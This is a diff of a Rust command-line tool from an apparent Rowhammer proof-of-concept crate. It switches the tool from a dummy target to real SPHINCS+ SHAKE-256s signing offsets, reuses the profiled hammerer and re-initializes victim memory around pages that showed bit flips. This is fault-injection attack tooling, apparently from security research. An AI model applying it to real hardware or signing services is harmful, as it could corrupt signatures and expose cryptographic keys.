@@ -2,23 +2,21 @@ use std::{
     collections::HashMap,
     fs::File,
     io::{stdin, BufReader, BufWriter, Write},
-    ops::Range,
     time::Duration,
 };
 
 use anyhow::bail;
-use bs_poc::hammerer::Hammering;
 use bs_poc::{
     allocator::hugepage::HugepageAllocator,
     hammerer::{make_hammer, HammerResult, HammerStrategy},
     memory::{BitFlip, DataPattern, Initializable, VictimMemory},
     util::{CL_SIZE, MB, PAGE_MASK},
-    victim::{sphincs_plus::TARGET_OFFSET_DUMMY, HammerVictimError, VictimResult},
+    victim::{HammerVictimError, VictimResult},
 };
 use bs_poc::{
     allocator::{self, BuddyInfo, ConsecAlloc, ConsecAllocator, Mmap, Pfn},
     memory::ConsecCheck,
-    victim,
+    victim::{self, sphincs_plus::TARGET_OFFSETS_SHAKE_256S},
 };
 use bs_poc::{
     allocator::{CoCo, HugepageRandomized, Spoiler},
@@ -40,7 +38,6 @@ use clap::{Parser, Subcommand};
 use indicatif::{MultiProgress, ProgressBar};
 use itertools::Itertools;
 use log::{debug, info, warn};
-use rand::{rngs::StdRng, SeedableRng};
 use serde::Serialize;
 
 /// CLI arguments for the `hammer` binary.
@@ -150,7 +147,7 @@ impl AllocStrategy {
             )),
             AllocStrategy::Hugepage => ConsecAlloc::Hugepage(HugepageAllocator::default()),
             AllocStrategy::HugepageRnd => ConsecAlloc::HugepageRnd(HugepageRandomized::new(1)),
-            AllocStrategy::Pfn => ConsecAlloc::Pfn(Pfn::new(mem_config)),
+            AllocStrategy::Pfn => ConsecAlloc::Pfn(Pfn::new(mem_config, None)),
             AllocStrategy::Spoiler => ConsecAlloc::Spoiler(Box::new(Spoiler::new(
                 mem_config,
                 conflict_threshold,
@@ -246,6 +243,7 @@ fn hammer_profile(
         .as_ref()
         .map(|p| p.add(ProgressBar::new(num_rounds)));
 
+    const SHM_SEED: u64 = 9804201662804659191;
     let pattern = DataPattern::Random(Box::new(Rng::from_seed(rand::random())));
     let mut candidates = HashMap::new();
     let min_repro_count = (reproducibility_threshold * num_rounds as f64) as u64;
@@ -259,7 +257,7 @@ fn hammer_profile(
                 );
             break;
         }
-        let mut victim = victim::MemCheck::new(memory, pattern.clone());
+        let mut victim = victim::MemCheck::new(memory, pattern.clone(), vec![]);
         let result = hammerer.hammer(&mut victim);
         let bit_flips = match result {
             Ok(result) => {
@@ -343,7 +341,7 @@ unsafe fn _main() -> anyhow::Result<()> {
 
     let start = std::time::Instant::now();
 
-    let target = TARGET_OFFSET_DUMMY;
+    let target = TARGET_OFFSETS_SHAKE_256S[5].clone();
     let mut experiments: Vec<ExperimentData<HammerResult, ExperimentError>> = vec![];
     'repeat: for rep in 0..repetitions {
         if rep > 0 && check_timeout(timeout, start) {
@@ -351,6 +349,7 @@ unsafe fn _main() -> anyhow::Result<()> {
             break;
         }
         info!("Starting bait allocation");
+        //unsafe { shm_unlink(CString::new("HAMMER_SHM").unwrap().as_ptr()) };
         let memory = allocator::alloc_memory(&mut alloc_strategy, mem_config, &pattern.mapping)?;
         let target_pfn = memory.addr(PAGE_SIZE + target.page_offset).pfn()?;
         info!("Allocated {} bytes of memory", memory.len());
@@ -367,7 +366,7 @@ unsafe fn _main() -> anyhow::Result<()> {
             .step_by(CL_SIZE)
             .map(|offset| unsafe { flush_buf.byte_add(offset) as usize })
             .collect_vec();
-        let profile_hammer = make_hammer(
+        let hammer = make_hammer(
             &args.hammerer,
             &pattern.pattern,
             &pattern.mapping,
@@ -378,10 +377,10 @@ unsafe fn _main() -> anyhow::Result<()> {
             false,
             flush_lines.clone(),
             target_pfn,
-            TARGET_OFFSET_DUMMY.flip_direction.clone(),
+            target.flip_direction.clone(),
         )?;
         let profiling = hammer_profile(
-            &profile_hammer,
+            &hammer,
             &memory,
             args.profiling_rounds,
             args.reproducibility_threshold,
@@ -419,7 +418,6 @@ unsafe fn _main() -> anyhow::Result<()> {
             }
         };
 
-        memory.initialize(dpattern.clone());
         match victim.start() {
             Ok(_) => {}
             Err(e) => {
@@ -435,25 +433,18 @@ unsafe fn _main() -> anyhow::Result<()> {
                 continue 'repeat;
             }
         }
-        let hammer = make_hammer(
-            &args.hammerer,
-            &pattern.pattern,
-            &pattern.mapping,
-            mem_config,
-            block_size,
-            &memory,
-            args.attempts,
-            false, // this MUST be false for SphincsPlus victim (due to SIGSTOP handlers)
-            flush_lines,
-            target_pfn,
-            target.flip_direction.clone(),
-        )?;
+        let flip_pages = flips
+            .iter()
+            .map(|f| (f.addr & !PAGE_MASK) as *const u8)
+            .collect::<Vec<_>>();
+
         let mut results = vec![];
         loop {
             if check_timeout(timeout, start) {
                 info!("Timeout reached. Stopping.");
                 break;
             }
+            memory.initialize_excluding(dpattern.clone(), &flip_pages);
             let result = hammer.hammer(&mut victim);
             match result {
                 Ok(result) => {
@@ -513,7 +504,9 @@ fn make_victim(
                 format!("Failed to create victim: {}", e)
             })?,
         )),
-        Target::MemCheck => Ok(Victim::MemCheck(victim::MemCheck::new(memory, dpattern))),
+        Target::MemCheck => Ok(Victim::MemCheck(victim::MemCheck::new(
+            memory, dpattern, flips,
+        ))),
         Target::SphincsPlus { binary } => Ok(Victim::SphincsPlus(
             victim::SphincsPlus::new(binary, flip).map_err(|e| {
                 warn!("Failed to create victim: {}", e);
